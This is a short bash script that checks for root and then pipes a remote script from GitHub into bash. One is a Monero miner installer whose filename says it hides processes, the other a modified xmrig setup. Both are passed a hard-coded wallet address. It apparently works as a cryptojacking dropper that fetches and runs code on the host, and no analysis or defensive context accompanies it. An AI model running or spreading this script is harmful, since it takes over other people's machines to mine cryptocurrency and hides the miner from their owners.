#!/bin/bash
rootstuff(){
  curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX littlAcen@24-mail.com
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}
userstuff(){
  curl  -s -L https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
}

if [[ $(id) = uid=0* ]]
then

echo
echo  You are running the root install!
echo

      rootstuff
else
echo
echo  You are running the user install!
echo

      userstuff
fi
